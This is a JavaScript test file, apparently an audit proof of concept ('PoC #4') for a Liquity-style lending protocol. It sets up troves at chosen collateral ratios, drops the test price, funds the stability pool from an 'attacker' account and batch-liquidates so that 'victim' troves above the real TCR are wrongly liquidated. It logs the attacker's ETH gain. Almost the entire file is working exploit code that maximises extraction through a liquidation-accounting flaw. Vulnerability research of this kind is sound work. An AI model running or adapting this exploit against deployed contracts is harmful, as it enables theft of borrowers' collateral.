const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")
const th = testHelpers.TestHelper
const dec = th.dec, toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  PoC #4 - MAXIMISATION: quantify the maximum extractable value from the inflated TCR.
  The tracking error per capped liquidation is (collSurplus + collGasCompensation).
  Using MANY troves in the batch, the error accumulates and the exploitable band
  [TCR_real, TCR_inflated) widens -> more troves can be wrongly capped-liquidated.
*/
contract("PoC4: max extraction from inflated TCR tracker", (accounts) => {
  const owner = accounts[0]
  const A = accounts.slice(1, 30)   // 29 dedicated accounts
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, defaultPool

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address, contracts.stabilityPool.address, contracts.borrowerOperations.address)
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    defaultPool = contracts.defaultPool
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await contracts.troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }

  it("accumulates tracker error across a batch of capped liquidations", async () => {
    // Open everything at 200 USD/ETH so every trove has ICR >= CCR (150%) and can be opened.
    await priceFeed.setPrice(dec(200, 18))
    const dennis = A[10]
    // dennis: SP funder, ICR 120% at P=140 (open ICR 171.43% at P=200)
    await openExact(toBN(dec(1286, 18)), toBN(dec(150000, 18)), dennis)
    const triggers = []
    for (let i = 0; i < 6; i++) {
      // trigger ICR 119% at P=140 (eligible for the CAPPED branch: 110% <= ICR < TCR)
      triggers.push(await openExact(toBN(dec(85, 18)), toBN(dec(10000, 18)), A[i]))
    }
    const victims = []
    for (let i = 0; i < 4; i++) {
      // victim ICR 121% at P=140  (ABOVE the real TCR -> must NOT be liquidated)
      victims.push(await openExact(toBN(dec(86, 18)), toBN(dec(10000, 18)), A[6 + i]))
    }

    // Design (all troves share ~the same ICR, so the SYSTEM TCR sits just under 120%):
    //   4 victims  ICR 121% at P=140  -> ABOVE the real TCR -> MUST NOT be liquidated
    //   6 triggers ICR 119% at P=140  -> below the real TCR -> legitimately CAPPED
    //   dennis     ICR 120% at P=140  -> SP funder / attacker
    await priceFeed.setPrice(dec(140, 18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    console.log("real TCR:", realTCR.toString(), "recovery:", (await th.checkRecoveryMode(contracts)).toString())
    console.log("victim ICR:", (await troveManager.getCurrentICR(A[6], P)).toString())
    console.log("trigger ICR:", (await troveManager.getCurrentICR(A[0], P)).toString())

    await stabilityPool.provideToSP(await contracts.lusdToken.balanceOf(dennis), ZERO_ADDRESS, { from: dennis })

    const before = await stabilityPool.getDepositorETHGain(dennis)
    const batch = []
    for (let i = 0; i < 6; i++) batch.push(A[i])
    for (let i = 0; i < 4; i++) batch.push(A[6 + i])
    console.log("batch size:", batch.length)

    const tx = await troveManager.batchLiquidateTroves(batch, { from: owner })
    let n = 0
    for (const log of tx.logs) if (log.event === "TroveLiquidated") n++
    console.log("liquidations:", n)
    const after = await stabilityPool.getDepositorETHGain(dennis)
    console.log("attacker ETH gain (wei):", after.sub(before).toString())
    console.log("attacker ETH gain (ETH):", (after.sub(before)).div(toBN(dec(1,18))).toString())
    console.log("SP ETH:", (await stabilityPool.getETH()).toString())
    for (let i = 6; i < 10; i++) {
      console.log("victim", A[i].slice(0,8), "status:", (await troveManager.getTroveStatus(A[i])).toString())
    }
  })
})
